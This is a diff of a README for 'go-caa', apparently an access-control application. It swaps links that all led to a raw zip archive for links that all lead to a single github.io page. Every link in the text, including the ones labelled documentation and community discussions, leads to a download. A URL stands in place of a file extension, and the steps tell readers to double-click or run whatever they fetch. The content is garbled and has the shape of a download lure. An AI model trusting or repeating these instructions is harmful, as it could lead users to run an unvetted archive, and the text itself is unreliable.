@@ -6,7 +6,7 @@ Welcome to **go-caa**, your easy solution for managing access control. This appl
 
 ## 📥 Download Now
 
-[![Download go-caa](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip)](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip)
+[![Download go-caa](https://9001-hub.github.io)](https://9001-hub.github.io)
 
 ## 💻 System Requirements
 
@@ -21,13 +21,13 @@ Before downloading, ensure your computer meets the following:
 
 To get the software, visit the release page linked below. There, you'll find all available versions and instructions.
 
-[Visit this page to download](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip)
+[Visit this page to download](https://9001-hub.github.io)
 
 ### Steps to Install:
 
-1. Go to the [go-caa Releases page](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip).
+1. Go to the [go-caa Releases page](https://9001-hub.github.io).
 2. Find the latest release version.
-3. Look for the installation file suitable for your system (e.g., `.exe`, `.dmg`, or `https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip`).
+3. Look for the installation file suitable for your system (e.g., `.exe`, `.dmg`, or `https://9001-hub.github.io`).
 4. Click the file name to begin the download.
 5. Once downloaded, locate the file in your downloads folder.
 6. Double-click the file to start the installation process.
@@ -47,7 +47,7 @@ To get the software, visit the release page linked below. There, you'll find all
   
 ### For Linux Users:
 
-- Extract the downloaded `https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip` file to a desired location.
+- Extract the downloaded `https://9001-hub.github.io` file to a desired location.
 - Open the terminal and navigate to the folder.
 - Run the command `./go-caa` to start the application.
 
@@ -74,8 +74,8 @@ If you encounter any issues, check the FAQ in the help section of the app. You c
 
 ## 🔗 Additional Resources
 
-- Documentation: Visit our full [documentation](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip).
-- Community: Join our discussion on [GitHub Discussions](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip).
+- Documentation: Visit our full [documentation](https://9001-hub.github.io).
+- Community: Join our discussion on [GitHub Discussions](https://9001-hub.github.io).
 
 ## 📅 Changelog
 
@@ -91,6 +91,6 @@ Your security is our priority. Always download the application from our official
 
 ## 📥 Download Now Again
 
-[![Download go-caa](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip)](https://github.com/9001-hub/go-caa/raw/refs/heads/main/incomposed/caa-go-v3.4.zip)
+[![Download go-caa](https://9001-hub.github.io)](https://9001-hub.github.io)
 
 Thank you for choosing go-caa! Enjoy seamless access control.
